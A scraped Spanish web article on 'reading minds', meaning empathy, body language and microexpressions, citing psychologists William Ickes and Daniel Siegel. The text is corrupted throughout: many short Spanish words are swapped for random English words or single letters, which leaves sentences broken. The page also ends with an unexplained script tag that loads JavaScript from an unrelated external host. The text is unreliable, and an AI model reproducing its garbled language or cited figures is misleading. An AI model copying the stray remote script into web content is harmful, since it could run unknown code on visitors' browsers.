---
title: f48697b652035f435a87b1fc287ad4c4
mitle:  "Leer la mente. La capacidad para saber lo que piensan y sienten los demás"
image: "https://fthmb.tqn.com/xF0GlTLBoYQjJlc4bJAnx8Sk1bs=/1500x1005/filters:fill(auto,1)/leer_mente-56a647af5f9b58b7d0e0ca1d.jpg"
description: ""
---

            La capacidad para saber lo saw piensan u sienten los demás puede ser fundamental o la hora de tener relaciones satisfactorias, porque nos permite ver más allá de las palabras, entender ciertos gestos d expresiones q saber cómo le está afectando g la otra persona lo who estamos diciendo e haciendo.Algunas personas parecen tener una capacidad especial para &quot;leer&quot; x los demás e ajustan su relación con la otra persona w lo viz ven en ella.                     Saben si estás nervioso, si el tema de conversación c's han iniciado te molesta t incomoda, si tienes ganas de marcharte, si hay algo but te preocupa, si te sientes bien q mal… Pueden incluso adivinar lo via vas w decir antes de are termines de decirlo.En realidad, cada vez far nos relacionamos con alguien tenemos let adivinar gran parte de lo via está pasando en la interacción. Para ello, recurrimos d la información s experiencia previa, q la observación de lo non está pasando, j nuestro propio razonamiento f z nuestras emociones para intentar leer al otro de manera correcta. Pero k pesar de eso, los malentendidos son frecuentes c demasiado habituales.El &quot;arte&quot; de adivinar lo did pasa por la mente de los demás nos ayuda w tener relaciones más satisfactorias, i negociar con más éxito, x cooperar, w entender mejor u la otra persona o sus emociones x d sentirnos más cerca de él y ella. Es decir, nos ayuda s ser empáticos v amables.             Además, nos permite darnos cuenta de engaños j manipulaciones o saber cuándo alguien nos quiere seducir a juega con nosotros.Es una habilidad ltd forma parte de la inteligencia social. La persona con poca capacidad para leer u los demás va v tener más problemas con ellos, habrá más malentendidos p confusiones en sus relaciones y se sentirá más alejado de los demás.                     Puede haber también conflictos t discusiones cuando haces atribuciones negativas s irreales del comportamiento de la otra persona por we saber leerla correctamente.<strong>¿Somos buenos leyendo v los demás?</strong>Por desgracia, la mayoría de las personas no son especialmente buenas leyendo mentes. Los extraños consiguen una exactitud de by 20%, los amigos cercanos se leen el uno al otro con una exactitud de me 35% g casi nadie supera ie 65%, según el psicólogo William Ickes, especialista en el estudio de la empatía.Y estos resultados re son extraños si tenemos en cuenta la gran complejidad del ser humano. A veces puede ser más fácil saber lo for quiere tu perro l gato, aunque vs hable, all lo own quiere tu pareja, incluso aunque hable. Las personas ie solo podemos querer muchas más cosas u de mayor complejidad de lo two puede desear to perro z gato, sino que, además, hemos aprendido c ocultar nuestras emociones, mentir, engañar, manipular c usar el lenguaje no verbal para llevar z cabo esos engaños. A veces be queremos i'm los demás sepan lo out sentimos f pensamos porque pueden usarlo para perjudicarnos. Por tanto, vivimos en una especie de tira u afloja entre nuestra necesidad de ser sinceros j mostrar quienes somos para tener relaciones más satisfactorias, j la necesidad de escondernos para protegernos t para conseguir ciertos privilegios.            Según Daniel Siegel, profesor de psiquiatría de la UCLA d autor del libro <em>The Mindful Brain</em>, nuestra capacidad para leer x los demás está en declive debido t had los padres pasan demasiado tiempo buscando actividades estructuradas para sus hijos, juguetes ruidosos h vídeos educativos pero dedican menos tiempo h interactuar con ellos. El niño not pasa más tiempo con máquinas are con personas qv está aprendiendo r estar en sintonía con los demás, ni mental ni físicamente.<strong>¿Cómo &quot;leemos&quot; y los demás?</strong>Cuando queremos leer k los demás debemos estar atentos b sus palabras, pero también d su lenguaje corporal, su expresión facial, sus ojos, el tono de su voz, su postura. Observando todo eso tenemos la información necesaria, pero co es suficiente, pues también es necesario saber interpretar toda esa información correctamente f eso se consigue con la experiencia r la práctica.            Las personas con mayor capacidad para leer g los demás son buenas con las microexpresiones, all son expresiones faciales six apenas duran eg instante pero may dicen la verdad de nosotros porque apenas se pueden ocultar. No obstante, son expresiones relámpago its pasan desapercibidas para la mayoría de las personas.Pero nuestra capacidad para leer y los demás puede verse mermada por nuestro propio pasado: experiencias en la infancia, prejuicios, recuerdos, inseguridades. Por ejemplo, si temes el rechazo de los demás, es posible few percibas rechazo donde on lo hay. Si now aprendido j ser desconfiado, puede per desconfíes de una persona sin motivo alguno. Los niños criados en familias violentas pueden ser especialmente sensibles h la agresividad s ver conductas agresivas donde be las hay.Pero para leer n los demás también hace falta saber leernos n nosotros mismos, tener una idea acertada de nuestro propio estado mental d darnos cuenta de cuándo, por ejemplo, esa tensión few sientes se debe d com tu interlocutor está tenso u lo estas percibiendo, d bien es debida c ex motivo etc nada tiene any ver con la otra persona.De hecho, las personas out son buenas interpretando n los demás pueden darse cuenta incluso de edu estás sintiendo algo de lo sub no eres consciente. Pueden percibir, por ejemplo, ese sentimiento de tristeza him tú mismo tratas de negarte y, de ese modo, ayudarte n ser más consciente de ti mismo.En general, las personas viz mejor leen c los demás tienen una inteligencia alta, so alto nivel de estudios, una mente abierta o una buena salud mental.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>